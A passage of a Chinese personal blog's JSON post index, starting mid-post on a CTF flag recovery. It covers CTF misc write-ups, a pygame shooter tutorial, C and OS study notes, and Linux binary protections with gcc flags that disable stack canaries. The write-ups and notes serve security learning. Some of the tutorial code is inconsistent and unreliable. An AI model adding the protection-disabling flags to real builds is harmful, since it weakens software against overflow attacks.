data.append(i[8:])for i in range(0, 1200):    for j in range(len(data)):        if i == time[j]:            result += data[j]with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as f:  # 将结果保存到out.txt文件中    f.write(result)\n\n之后导出图片，发现图片乱七八糟，想到之前w465应该是width465转成十六进制码就是1D1，得到图片\n\n结合前面得到flag：CISCN{15030442_b586_4c9e_b436_26def12293e4}\n","slug":"CISCN复现","date":"2021-05-18T11:25:16.000Z","categories_index":"MISC","tags_index":"wp","author_index":"Krito"},{"id":"7ceb9bfebefe73ecc89b8753e3a43190","title":"pygame使用","content":"\n\n\n\n\n\n\n\n\n了解，学习一个第三方模块，最好是去官网学习，因为官方有第一手资料，而在其他人手里则是第二手，使用要学好还是得去官网。在这里我就直接拿实例讲pygame\n安装pygame (windows)1python -m pip install -U pygame --user\n\n可能的报错：\n\n输入python可能会报错，改成python3\n无法下载，检查网络是否正常，确认无误还是无法下载，查看是否使用了梯子，如果使用就关闭。\n\n设计思路设计一个游戏必须先有思路，这里我引用了一个大佬的图片，基本思路差不多，接下来就根据这个思路开始设计这个游戏\n\n首先，在设计时要明确游戏有哪些元素，从而创建对应的类。在飞机大战中，要创建以下几个类：\n\n用于管理游戏资源和行为的类（我是将它放在alien_invasion.py文件中，作为游戏的入口）\n\n存储游戏设置的类（settings.py）\n\n存储飞机的类（ship.py）\n\n存储子弹的类（bullet.py）\n\n存储敌机的类（Alien.py）\n\n存储游戏初始数据的类（game_stats.py）\n\n存储得分的类（scoreboard.py）\n\n存储初始游戏界面的类（bottom.py）\nalien_invasion.py首先要初始化要显示的窗口或屏幕\n12345678910111213141516import sysimport pygameclass AlienInvasion:    def __init__(self):                                    pygame.init()                                                                                   #pygame.init()安全地初始化了所有导入的pygame模块        self.screen = pygame.display.set_mode((1200,800))         #初始屏幕，1200是屏幕宽度，800是屏幕高度        pygame.display.set_caption(&quot;Alien Invasion&quot;)                      #在屏幕边框上面添加游戏名Alien Invasion    def run_game(self):                                                                         #游戏主循环，让游戏不断持续下去        while True:            for event in pygame.event.get():                if event.type == pygame.QUIT:                                          # 如果用户输入q游戏就结束                    sys.exit()            pygame.display.flip()if __name__ == &#x27;__main__&#x27;:      ai = AlienInvasion()    ai.run_game()\n\n相关代码解释：\n**if __ name __ == ‘ __ main ： ‘**： name __ 是当前模块名，当模块被直接运行时模块名为 __ main __ 。这句话的意思就是，当模块被直接运行时，以下代码块将被运行，当模块是被导入时，代码块不被运行。（如果还是有疑惑查看链接）\nfor event in pygame.event.get()：Pygame会接受用户的各种操作（比如按键盘，移动鼠标等）产生事件，事件随时可能发生，而且量也可能会很大，Pygame的做法是把一系列的事件存放一个队列里，逐个的处理。这行代码就是将事件逐一读取。\nsettings.py存储游戏元素属性\n123456789101112131415161718192021222324252627282930class Settings:    def __init__(self):        self.screen_width = 1200                 #屏幕宽度        self.screen_height = 600                 #屏幕高度        self.bg_color = (230, 230, 230)      #背景颜色        self.ship_speed = 1.5              \t        #飞船移动速度        self.bullet_speed = 1.5          \t     #子弹速度        self.bullet_width = 3            \t      #子弹宽度        self.bullet_height = 15           \t      #子弹长度        self.bullet_color = (60,60,60)        #子弹颜色        self.bullet_allowed = 5           \t     #子弹数量        self.alien_speed = 1.0            \t     #外星人移动速度        self.fleet_drop_speed = 10           #外星人设置        self.fleet_direction = 1          \t     #1是右移，-1是左移动        self.ship_limit = 3                           #设置生命次数        self.speedup_scale = 1.1               #游戏运行的速度        self.score_scale = 1.5                    #根据游戏速度提高外星人的分数    def initialize_dynamic_settings(self):                              #初始化在整个游戏中更改的设置        self.ship_speed = 1.5                                                         #飞船移动速度        self.bullet_speed = 3.0                                                     #子弹移动速度        self.alien_speed = 1.0                                                       #外星人移动速度        self.fleet_direction = 1                                                       #外星人移动方向        self.alien_points = 50                                                         #每个外星人的分数    def increase_speed(self):                                                                       #提高速度设置和外星人分数        self.ship_speed *= self.speedup_scale        self.bullet_speed *= self.speedup_scale        self.alien_speed *= self.speedup_scale        self.alien_points = int(self.alien_points * self.score_scale)\n\n\n\nship.py\n\n1234567891011121314151617181920212223import pygameclass Plane:    def __init__(self,ai_game):        # 初始化小飞机并设置其初始位置        self.screen = ai_game.screen                                                              #加载图像，并获得其矩形区域        self.settings = ai_game.settings                                                         #读取设置里面的信息        self.img_plane = pygame.image.load(&quot;images/ship.bmp&quot;)          #加载飞船照片        self.screen_rect = ai_game.screen.get_rect()                              #得到飞船的的矩形区域        self.screen_rect = self.screen.get_rect()                                        #得到screen的矩形区域        self.rect.midbottom = self.screen_rect.midbottom                      # 将飞船放到底部中央        self.x = float(self.rect.x)                                                                        #存储飞机的位置    def blitme(self):        # 在指定位置绘制小飞机        self.screen.blit(self.image, self.rect)    def update(self):                                                                                                       #根据运动标记更新飞船的位置        if self.moving_right and self.rect.right &lt; self.screen_rect.right:            #如果飞船向右移动没有超过边界，飞船就向右移动x（x大小根据设置里面的飞船速度）            self.x += self.settings.ship_speed        if self.moving_left and self.rect.left &gt; 0:                                                        #如果飞船向左移动没有超过边界，飞船就向左移动x             self.x -= self.settings.ship_speed             self.rect.x = self.x                                                                                             #更新飞船位置    def center_ship(self):                                                                                 #将飞船居中        self.rect.midbottom = self.screen_rect.midbottom                       #定义飞船居中位置为屏幕下面底部中央        self.x = float(self.rect.x)                                                                         #更新飞船位置\n\nbullet.py123456789101112131415161718import pygamefrom pygame.sprite import Spriteclass Bullet(Sprite):    def __init__(self, ai_game):                                                                   #在舰船的当前位置创建一个子弹对象        super().__init__()                                                                                   #继承        self.screen = ai_game.screen        self.settings = ai_game.settings        self.color = self.settings.bullet_color        self.rect = pygame.Rect(0, 0, self.settings.bullet_width,self.settings.bullet_height)              #创建一个子弹并放置在正确位置        self.rect.midtop = ai_game.ship.rect.midtop        self.y = float(self.rect.y)                                                                          #存储子弹的位置    def update(self):                                                                                            #更新子弹位置        self.y -= self.settings.bullet_speed        self.rect.y = self.y    def draw_bullet(self):                                                                                   #在屏幕上绘制子弹        pygame.draw.rect(self.screen, self.color, self.rect)\n\ngame_stats.py1234567891011121314class GameStats:    &quot;&quot;&quot;Track statistics for Alien Invasion.&quot;&quot;&quot;        def __init__(self, ai_game):        &quot;&quot;&quot;Initialize statistics.&quot;&quot;&quot;        self.settings = ai_game.settings        self.reset_stats()        self.game_active = False                                           #自动开启游戏        self.high_score = 0\t\t\t\t\t\t       #高分永远不要重置。            def reset_stats(self):\t\t\t\t\t\t    #初始化游戏数据        self.ships_left = self.settings.ship_limit        self.score = 0        self.level = 1\n\nscoreboard.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import pygame.fontfrom pygame.sprite import Groupfrom ship import Shipclass Scoreboard:    def __init__(self, ai_game):                       #初始化得分属性        self.ai_game = ai_game        self.screen = ai_game.screen        self.screen_rect = self.screen.get_rect()        self.settings = ai_game.settings                self.stats = ai_game.stats                                      #得分信息的字体设置        self.text_color = (30, 30, 30)        self.font = pygame.font.SysFont(None, 48)        self.prep_score()                                                       #初始乐谱图像        self.prep_high_score()        self.prep_level()        self.prep_ships()    def prep_score(self):        &quot;&quot;&quot;Turn the score into a rendered image.&quot;&quot;&quot;        rounded_score = round(self.stats.score, -1)        score_str = &quot;&#123;:,&#125;&quot;.format(rounded_score)        self.score_image = self.font.render(score_str, True,                self.text_color, self.settings.bg_color)                self.score_rect = self.score_image.get_rect()               #在屏幕右上方显示分数        self.score_rect.right = self.screen_rect.right - 20        self.score_rect.top = 20    def prep_high_score(self):                                                     #将高分转换为图像        high_score = round(self.stats.high_score, -1)        high_score_str = &quot;&#123;:,&#125;&quot;.format(high_score)        self.high_score_image = self.font.render(high_score_str, True,                self.text_color, self.settings.bg_color)                    self.high_score_rect = self.high_score_image.get_rect()          #将高分居中显示在屏幕顶部        self.high_score_rect.centerx = self.screen_rect.centerx        self.high_score_rect.top = self.score_rect.top    def prep_level(self):                                                                      #将等级转换为渲染的图像。        level_str = str(self.stats.level)        self.level_image = self.font.render(level_str, True,                self.text_color, self.settings.bg_color)            self.level_rect = self.level_image.get_rect()                 #将级别定位在分数下方        self.level_rect.right = self.score_rect.right        self.level_rect.top = self.score_rect.bottom + 10    def prep_ships(self):                                                                 #显示生命值        self.ships = Group()        for ship_number in range(self.stats.ships_left):            ship = Ship(self.ai_game)            ship.rect.x = 10 + ship_number * ship.rect.width            ship.rect.y = 10            self.ships.add(ship)    def check_high_score(self):                                               #检查是否有新高分        if self.stats.score &gt; self.stats.high_score:            self.stats.high_score = self.stats.score            self.prep_high_score()    def show_score(self):                                                            #在屏幕上面绘制分数和其它信息        self.screen.blit(self.score_image, self.score_rect)        self.screen.blit(self.high_score_image, self.high_score_rect)        self.screen.blit(self.level_image, self.level_rect)        self.ships.draw(self.screen)\n\nbotto.py123456789101112131415161718192021222324252627import pygame.font class Button:     def __init__(self, ai_game, msg):                 #初始化        self.screen = ai_game.screen        self.screen_rect = self.screen.get_rect()                self.width, self.height = 200, 50               #设置按钮的尺寸和属性        self.button_color = (0, 255, 0)        self.text_color = (255, 255, 255)        self.font = pygame.font.SysFont(None, 48)                self.rect = pygame.Rect(0, 0, self.width, self.height)    #放置play图标        self.rect.center = self.screen_rect.center                self._prep_msg(msg)                                  #该按钮仅需准备一次    def _prep_msg(self, msg):                              #将其转换为渲染的图像，然后在按钮上居中显示文本。        self.msg_image = self.font.render(msg, True, self.text_color,                self.button_color)        self.msg_image_rect = self.msg_image.get_rect()        self.msg_image_rect.center = self.rect.center    def draw_button(self):                                     #在屏幕上面绘制        self.screen.fill(self.button_color, self.rect)        self.screen.blit(self.msg_image, self.msg_image_rect)\n\n重构alien_invasion.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252import sysfrom time import sleepimport pygamefrom settings import Settingsfrom game_stats import GameStatsfrom scoreboard import Scoreboardfrom button import Buttonfrom ship import Shipfrom bullet import Bulletfrom alien import Alien&quot;&quot;&quot;管理游戏资源和行为的类&quot;&quot;&quot;class AlienInvasion:    def __init__(self):        &quot;&quot;&quot;初始化游戏并创建游戏资源&quot;&quot;&quot;        pygame.init()        self.settings = Settings()        self.screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)        self.settings.screen_width = self.screen.get_rect().width        self.settings.screen_height = self.screen.get_rect().height        pygame.display.set_caption(&quot;Alien Invasion&quot;)        &quot;&quot;&quot;创建一个实例来存储游戏统计信息，并创建一个记分板。&quot;&quot;&quot;        self.stats = GameStats(self)        self.sb = Scoreboard(self)        self.ship = Ship(self)        self.bullets = pygame.sprite.Group()        self.aliens = pygame.sprite.Group()        self._create_fleet()        &quot;&quot;&quot;设置play&quot;&quot;&quot;        self.play_button = Button(self, &quot;Play&quot;)    &quot;&quot;&quot;开启游戏并循环&quot;&quot;&quot;    def run_game(self):        while True:            self._check_events()            if self.stats.game_active:                self.ship.update()                self._update_bullets()                self._update_aliens()            self._update_screen()    &quot;&quot;&quot;响应按键和鼠标事件&quot;&quot;&quot;    def _check_events(self):        for event in pygame.event.get():            if event.type == pygame.QUIT:                sys.exit()            elif event.type == pygame.KEYDOWN:                self._check_keydown_events(event)            elif event.type == pygame.KEYUP:                self._check_keyup_events(event)            elif event.type == pygame.MOUSEBUTTONDOWN:                mouse_pos = pygame.mouse.get_pos()                self._check_play_button(mouse_pos)    &quot;&quot;&quot;当玩家单击播放时开始新游戏&quot;&quot;&quot;    def _check_play_button(self, mouse_pos):        &quot;&quot;&quot;Start a new game when the player clicks Play.&quot;&quot;&quot;        button_clicked = self.play_button.rect.collidepoint(mouse_pos)        if button_clicked and not self.stats.game_active:            #重置游戏设置            self.settings.initialize_dynamic_settings()            #重置游戏统计信息            self.stats.reset_stats()            self.stats.game_active = True            self.sb.prep_score()            self.sb.prep_level()            self.sb.prep_ships()            #摆脱任何剩余的外星人和子弹            self.aliens.empty()            self.bullets.empty()                        #建立一个新的舰队并集中舰船            self._create_fleet()            self.ship.center_ship()            #隐藏鼠标光标            pygame.mouse.set_visible(False)    &quot;&quot;&quot;响应按键&quot;&quot;&quot;    def _check_keydown_events(self, event):        if event.key == pygame.K_RIGHT:            self.ship.moving_right = True        elif event.key == pygame.K_LEFT:            self.ship.moving_left = True        elif event.key == pygame.K_q:            sys.exit()        elif event.key == pygame.K_SPACE:            self._fire_bullet()        &quot;&quot;&quot;释放按键&quot;&quot;&quot;    def _check_keyup_events(self, event):        if event.key == pygame.K_RIGHT:            self.ship.moving_right = False        elif event.key == pygame.K_LEFT:            self.ship.moving_left = False    &quot;&quot;&quot;创建一个新的项目符号并将其添加到项目符号组&quot;&quot;&quot;    def _fire_bullet(self):        if len(self.bullets) &lt; self.settings.bullets_allowed:            new_bullet = Bullet(self)            self.bullets.add(new_bullet)    &quot;&quot;&quot;更新项目符号的位置并摆脱旧项目符号&quot;&quot;&quot;    def _update_bullets(self):        # 更新子弹位置        self.bullets.update()        # 消除子弹        for bullet in self.bullets.copy():            if bullet.rect.bottom &lt;= 0:                 self.bullets.remove(bullet)        self._check_bullet_alien_collisions()    &quot;&quot;&quot;子弹与外星人的碰撞&quot;&quot;&quot;    def _check_bullet_alien_collisions(self):        # 消除被打到的子弹和外星人        collisions = pygame.sprite.groupcollide(                self.bullets, self.aliens, True, True)        if collisions:            for aliens in collisions.values():                self.stats.score += self.settings.alien_points * len(aliens)            self.sb.prep_score()            self.sb.check_high_score()        if not self.aliens:            # 销毁现有子弹并建立新的舰队            self.bullets.empty()            self._create_fleet()            self.settings.increase_speed()            # Increase level.            self.stats.level += 1            self.sb.prep_level()    &quot;&quot;&quot;检查舰队是否处于边缘，然后更新舰队中所有外星人的位置。&quot;&quot;&quot;    def _update_aliens(self):        self._check_fleet_edges()        self.aliens.update()        # 寻找与外星人的碰撞        if pygame.sprite.spritecollideany(self.ship, self.aliens):            self._ship_hit()        # 寻找外星人撞到屏幕底部        self._check_aliens_bottom()    &quot;&quot;&quot;检查是否有任何外星人到达屏幕底部&quot;&quot;&quot;    def _check_aliens_bottom(self):        screen_rect = self.screen.get_rect()        for alien in self.aliens.sprites():            if alien.rect.bottom &gt;= screen_rect.bottom:                # Treat this the same as if the ship got hit.                self._ship_hit()                break    &quot;&quot;&quot;被外星人击中&quot;&quot;&quot;    def _ship_hit(self):        if self.stats.ships_left &gt; 0:            # 减少生命，并更新记分板.            self.stats.ships_left -= 1            self.sb.prep_ships()                        # 摆脱任何剩余的外星人和子弹.            self.aliens.empty()            self.bullets.empty()                        # 建立一个新的舰队并集中舰船.            self._create_fleet()            self.ship.center_ship()                        # 暂停            sleep(0.5)        else:            self.stats.game_active = False            pygame.mouse.set_visible(True)    &quot;&quot;&quot;建立外星人的舰队&quot;&quot;&quot;    def _create_fleet(self):        # 创建一个外星人并连续查找外星人的数量。        # 每个外星人之间的间距等于一个外星人的宽度。        alien = Alien(self)        alien_width, alien_height = alien.rect.size        available_space_x = self.settings.screen_width - (2 * alien_width)        number_aliens_x = available_space_x // (2 * alien_width)                # 确定适合屏幕的外星人行数        ship_height = self.ship.rect.height        available_space_y = (self.settings.screen_height -                                (3 * alien_height) - ship_height)        number_rows = available_space_y // (2 * alien_height)                # 建立完整的外星人舰队.        for row_number in range(number_rows):            for alien_number in range(number_aliens_x):                self._create_alien(alien_number, row_number)    &quot;&quot;&quot;创建外星人并将其放置在行中&quot;&quot;&quot;    def _create_alien(self, alien_number, row_number):        alien = Alien(self)        alien_width, alien_height = alien.rect.size        alien.x = alien_width + 2 * alien_width * alien_number        alien.rect.x = alien.x        alien.rect.y = alien.rect.height + 2 * alien.rect.height * row_number        self.aliens.add(alien)    &quot;&quot;&quot;如果有任何外星人到达边缘，请做出适当的反应&quot;&quot;&quot;    def _check_fleet_edges(self):        for alien in self.aliens.sprites():            if alien.check_edges():                self._change_fleet_direction()                break                def _change_fleet_direction(self):        &quot;&quot;&quot;放下整个舰队并更改舰队的方向.&quot;&quot;&quot;        for alien in self.aliens.sprites():            alien.rect.y += self.settings.fleet_drop_speed        self.settings.fleet_direction *= -1    &quot;&quot;&quot;更新屏幕上的图像，然后切换到新屏幕&quot;&quot;&quot;    def _update_screen(self):        &quot;&quot;&quot;Update images on the screen, and flip to the new screen.&quot;&quot;&quot;        self.screen.fill(self.settings.bg_color)        self.ship.blitme()        for bullet in self.bullets.sprites():            bullet.draw_bullet()        self.aliens.draw(self.screen)        # 绘制分数信息.        self.sb.show_score()        #如果游戏处于非活动状态，请绘制播放按钮.        if not self.stats.game_active:            self.play_button.draw_button()        pygame.display.flip()if __name__ == &#x27;__main__&#x27;:    # 运行游戏    ai = AlienInvasion()    ai.run_game()\n\n总结在设计时是需要不断对每个模块进行重构，重构的目的一是为了使代码看起来更简洁，而是优化代码，减少不必要的代码。除此之外，还需要对项目进行不断检查，检查是否有bug，对bug要进行即使修改。还有，python虽然使用起来非常方便，但是需要记住的函数却很多，要熟练的使用，必须要能够熟悉相关的第三方库，这样才能做到游刃有余。\n","slug":"pygame使用","date":"2021-05-12T12:25:39.000Z","categories_index":"心得","tags_index":"python","author_index":"Krito"},{"id":"1521d5bfeaaa79eb316ce7916671f885","title":"蓝帽杯MISC","content":"冰墩墩拿到附件拖进虚拟机中使用binwalk查看\n\n发现里面存在rar压缩包，使用foremost进行分离\n\n\n发现音频和提示\n将音频放进010，在结尾发现cipher\n将对应的十六进制码复制下来，搜索以0~F编码的加密方式，发现是url编码。\n对十六进制码进行处理\n解码后发现是一堆表情包\n对表情包进行解码发现无法翻译，搜索了一下发现可能是emoji-aes加密，但缺少密匙，之后回去在看mp3文件，想到misc里面有一个MP3stego的工具，但是还需要一个密码才有行，想到之前的eight numbers，加上题目名称，猜测可能是冬奥会举办日期20220204\n得到一个txt文件，发现是python里面的一种编码方式\n发现是wingdings图标，在线解码，得到密匙How_6ad_c0uld_a_1cePeak_be?   之后进行emoji-aes解码得到flag\n","slug":"蓝帽杯MISC","date":"2021-05-04T02:34:09.000Z","categories_index":"MISC","tags_index":"write up","author_index":"Krito"},{"id":"af7567a01704ef88a3107a466485b1d6","title":"程序员的自我修养","content":"分段基本思路使把一段与程序所需的内存空间大小的虚拟空间映射到某个地址空间。采用分段的方法可以解决以下几个问题\n\n地址空间不隔离。如果不同程序间地址连续很容易被恶意程序通过溢出手段使其它程序崩溃或者产生严重后果，而分段可以避免这种情况，比如此时有A,B两个程序，此时操作系统会分配两个虚拟地址，初始地址都是0x00000000，终止地址为程序的大小，一旦该程序访问超过了这个虚拟地址空间，操作系统就会抛出拒绝访问，如果正常访问，操作系统就会将虚拟地址映射到空闲物理地址中。\n\n\n解决运行地址不确定。每次程序装载运行时，操作系统为其分配的空闲地址是不确定的，比如这次是0x00000000 ~ 0x00A00000，下一次可能就是0x00200000 ~ 0x00C00000，但是采用分段的方法，在虚拟内存中程序起始地址和终止地址不会发生改变，很好的解决了解决运行地址不确定这一问题。\n\n对不同的段设置不同的权限。比如数据段就不会有执行权限，只读段只有读取的权限，有效的防止了溢出攻击，加大程序被攻破的难度\n\n适应CPU的缓存体系。CPU缓存体系被分为数据缓存和指令缓存，采用分段的方法极大地提高了缓存的命中率。\n\n有利于共享空间，节约内存。比如系统在运行某一个程序时，可能出现多个该程序的多个副本，这些副本代码是一样的且只可读，所以可以采取共享一个段的方法来节约内存。\n当然，分段并不是完美无缺的，当内存不够时，操作系统会将一些在内存中进程存进磁盘，采用分段的方法，由于映射的单位是程序，所以换入换出的是整个程序，粒度较大，严重影响了运行速度\n\n\n不要让CPU打盹CPU的价值巨大，为了充分利用CPU，早期采用多道程序的方法利用CPU，就是当某个程序不再需要CPU时，监控程序就会将需要CPU的程序自动开启，虽然提高CPU利用率，但是不能很好满足用户需求，比如用户要启动一个程序，可能要等待上一个程序上一个程序完成才行，这是极为致命，所以改进为分时系统，分时系统能够较好的改良这个问题，如果有个程序在使用CPU，但此时用户要启动另一个程序，系统就会暂停这个程序，去完成用户指定的程序，但这个办法缺点是，如果有个程序霸占CPU，那么即使用户要启动另一个程序依旧要等待，因为所有的优先级是一样的，为了解决这个问题，改进为如今的多任务系统，这个系统中操作系统有了最高权限，接管了所有的硬件资源，且受硬件保护，应用程序都是以进程的运行，它们的权限会比操作系统低，同时，每个进程都会有独立的地址空间，让进程相互分开。不仅如此，每个进程都有有个优先级，能够有序的运行，万一优先级较高的进程霸占了CPU，操作系统就会“出手”暂停这个进程将CPU分给下一个进程，也就是所谓的抢占式。\n进程与线程进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。线程被称为轻量级进程是程序执行流的最小单元，由线程ID，当前指令指针，寄存器集合和堆栈组成。线程可以访问进程内存里面所有数据，甚至包括其他线程等等堆栈(要知道其他线程堆栈的地址，很少见的情况)，当然线程也有私有内存空间，如栈(并非完全私有)，线程局部存储，寄存器。而在Linux下没有线程与进程的概念，但是有类似作用的任务，任务相当于线程，但是任务之间可以选择共享内存空间，这些任务组合起来就相当于Windows下的进程。\n线程同步二元信号量　　是最简单的一种锁，适合只能被唯一一个线程独占访问的资源；对于允许多个线程并发访问的资源，多元信号量简称信号量；\n互斥量　　和二元信号量很类似，资源仅同时允许一个线程访问，但和信号量不同的是，信号量在整个系统可以被任意线程获取并释放；也就是说哪个线程锁的，要哪个线程解锁。\n临界区　　是比互斥量更加严格的同步手段。在术语中，把临界区的获取称为进入临界区，而把锁的释放称为离开临界区。与互斥量和信号量的区别：\n　　(1)互斥量和信号量字系统的任何进程都是可见的。\n　　(2)临界区的作用范围仅限于本进程，其他进程无法获取该锁。\n","slug":"程序员的自我修养","date":"2021-05-02T07:24:45.000Z","categories_index":"读书笔记","tags_index":"程序员的自我修养","author_index":"Krito"},{"id":"20bf7105b3d9595b11047eca410abfeb","title":"C语言函数调用与常见调用约定","content":"函数调用下面代码展示了一个简单的加法子函数调用\n12345678910#include&lt;stdio.h&gt;int plus (int a,int b)&#123;    return a+b;&#125;void main()&#123;    int a=1,b=2,c;    c=plus(a,b);&#125;\n\n进入反汇编查看\n\n首先，系统会将1，2分别移动到a，b对应的地址中，之后从右至左将b，a对应地址的值移动到eax，ecx中，之后进行跳转到plus函数的plt表\n\n再跳转到plus函数的实际中\n\n子函数先是把ebp保存在栈中，之后通过mov指令将ebp指向esp指向的位置，esp再进行抬栈处理，然后保存现场（将ebx，esi，edi存储的值保存在堆栈中）,接下来把ebp-0ch对应的地址移动到edi中。之后向ecx赋30h，向eax赋0CCCCCCCCh，然后对es:edi对应的地址开始循环赋值（整个过程就是对缓冲区初始化）。（后面两个不知道是什么，太菜了😅）\n补：缓冲区用于存储函数调用里面申请的变量，因为这些变量存放在缓冲区，当调用完成后缓冲区会被丢弃，所以函数调用里面的变量无法被函数外面访问到\n\n接下来就是将a的值移动到eax中再加b的值，后面再恢复现场，再内平栈（add esp 0C0h）,之后比较esp，ebp是否相同，（如果相同我也不知道会怎么样，😅），然后将esp指向ebp指向的位置，将ebp返回到原来的地方。\n\n最后外平栈（add esp,8），将计算结果从eax移到变量c对应的地址中，至此完成函数调用\n\n常见的三种调用约定（32位）\n第一种就是系统默认的调用约定，调用者清理栈，就是和上面外平栈（add esp,8）差不多\n第二种就是在返回时对ret进行处理，使栈指针指向调用参数前的地址（如：ret 8）\n第三种就是通过寄存器传参，但如果寄存器不够还是得借助栈来传参，因为cpu与寄存器之间传递相对于cpu与内存更快，所以第三种方法在参数较少时，更加高效。\n","slug":"C语言函数调用与常见调用约定","date":"2021-04-25T14:02:30.000Z","categories_index":"C语言","tags_index":"收获","author_index":"Krito"},{"id":"6ab7ba8971edf760af996dc2bda9f711","title":"switch语句高效的原因","content":"switch语句和if语句都是条件判断语句，但是switch语句更加高效，因而许多公司在设计时大多采用switch语句\n\n当分支语句较少时，switch与if语句并没有什么区别都是先判断，之后再跳转\n\n\n\n当分支较多时，switch语句就发生变化，并没有挨个判断再跳转，只跳转了一次\n\n\n\n\nswitch语句会维护一张跳转表，不管case判断语句的值是不是按照顺序的，内存中的地址表都会按照顺序进行排列。分析汇编代码会发现，编译器先是将x的值赋给ecx寄存器，之后ecx减去case中最小值并与case中最大值比较，大于就会跳转到default，不大于就会将ecx寄存器中的值移到edx中,之后跳转到edx * 4+14191Ch对应的地址，查看地址发现ABCD四个字符存放的位置就是相差4个字节。所以，当分支较多时，switch-case不用像if-else if那样遍历条件分支直到命中条件，而只需访问对应索引号的表项从而到达定位到分支。从数据结构与算法的角度来看，switch 语句相当于一个数组，其查询时间复杂度为 O(1)；而 if-lese 语句相当于一个链表，其时间复杂度为 O(n)\n\n总结使用switch语句时，程序首先判断switch变量是否大于（小于）最大（最小）case 常量，若大于（小于），则跳到default分支处理；否则取得索引号为switch变量大小的跳表项的地址（即跳表的起始地址＋表项大小＊索引号），程序接着跳到此地址执行，到此完成了分支的跳转。。即使case情况不连续或者case情况相差较大时，也能达到相应的效果。\n\n参考文章：https://blog.csdn.net/zbw1185/article/details/103359426\n","slug":"switch语句高效的原因","date":"2021-04-25T04:48:37.000Z","categories_index":"C语言","tags_index":"收获","author_index":"Krito"},{"id":"33eb1f0294c927088b5a7d2617a42d07","title":"从源文件到可执行文件","content":"从源文件到可执行文件C源文件到可执行文件共经历了4个过程，包括预处理、编译、汇编、链接。这里在Linux环境下展示此过程，源代码如下：\n1234567#include&lt;stdio.h&gt;#define hello &quot;Hello World&quot;int main()&#123;\tprintf(hello);    return 0;&#125;\n\n预处理在这个阶段，编译器会做以下事情：\n\n将所有的#define删除，并将宏定义展开。\n处理一些条件预编译指令如#ifndef,#ifdef,#elif,#else,#endif等。将不必要的代码过滤掉。\n处理#include预编译指令，将被包含的文件插入到该预编译指令的位置。这个过程是递归进行的，因为被包含的文件可能也包含其他文件。\n预处理过程还会过滤掉所有注释/**/和//里面的内容。\n另外还会添加行号和文件名标识。\n最后会保留#pragma编译器指令，因为编译器需要使用它们。\n\n补充：#include&lt;&gt; ，从标准库中寻找头文件，#include””，从当前目录开始寻找头文件。查看预处理后的文件在.i文件中#include&lt;stdio.h&gt;展开，输出里面的宏定义hello也被替换成Hello World\n编译编译阶段，C语言每条语句都以一种标准的文件格式确切地描述了一条低级机器语言指令生成编译后的文件\n\n可以看到C语言文件被翻译成汇编代码，每条语句都以一种标准的文件格式确切地描述了一条低级机器语言指令\n汇编汇编阶段，编译器将hello.s翻译成机器语言指令, 把这些指令打包成一种可重定位目标程序的格式, 并把结果保存在hello.o中, hello.o是一个二进制文件, 它的字节编码是机器语言指令, 而不是字符通过以下指令查看汇编后的文件\n链接在这个阶段，编译器会将含有调用函数的目标文件以某种方式合并起来生成可以执行文件（比如printf函数的目标文件就在printf.o），命令：gcc hello.o -o hello\n","slug":"从源文件到可执行文件","date":"2021-04-21T03:22:39.000Z","categories_index":"C语言","tags_index":"收获","author_index":"Krito"},{"id":"8c5e835735464cb680ea7b5b166e5319","title":"解决hexo博客图片无法加载问题","content":"起初搭建好博客时，发现照片无法上传本地照片，\n\n根据网上的方法整了半天也没整好，最后还是室友告诉我通过下面的方法才可以引用本地照片\n1&lt;img src&#x3D;&quot;path&quot; height&#x3D;&quot;xxx&quot; width&#x3D;&quot;xxx&quot; &#x2F;&gt;\n\n但是用这个方法需要在source目录下创建一个目录来存储照片，后面写多了博客，发现这样会特别杂乱，而且最最重要的是虽然能在博客上显示，但是不能在本地显示，操作起来非常不方便。\n\n于是在网上找了半天，各种方法都是了一遍终于发现解决办法\n参考链接\n首先下载插件：\n1yarn add https:&#x2F;&#x2F;github.com&#x2F;CodeFalling&#x2F;hexo-asset-image\n\n之后修改博客根目录文件_config.yml中的 post_asset_folder: false，将其改成post_asset_folder: true（注意冒号后面有个空格）,然后就可以通过markdown语法正常上传照片了\n这个方法不仅支持使用markdown语法，而且写博客会创建一个同名文件夹来存放照片，非常方便，而且最重要的是可以在本地预览\n","slug":"解决hexo博客图片无法加载问题","date":"2021-04-20T08:51:23.000Z","categories_index":"问题","tags_index":"博客","author_index":"Krito"},{"id":"49b5f2dc0a9e31a5cb54c844157811ae","title":"Linux常见的保护机制","content":"checksec（gdb安装好就有）gdb动态调试软件，必备。\n安装：\n1apt-get install gdb\n\n用法作用：它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。\n用法：checksec filename\n例子：\n123456gdb-peda$ checksec startCANARY    : disabled(这个选项表示栈保护功能有没有开启。)FORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : disabled\n\nCANNARY(栈保护)栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈中高危区插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。**\ngcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。\n因此在编译时可以控制是否开启栈保护以及程度，例如：\n123gcc -fno-stack-protector -o test test.c  &#x2F;&#x2F;禁用栈保护gcc -fstack-protector -o test test.c   &#x2F;&#x2F;启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o test test.c 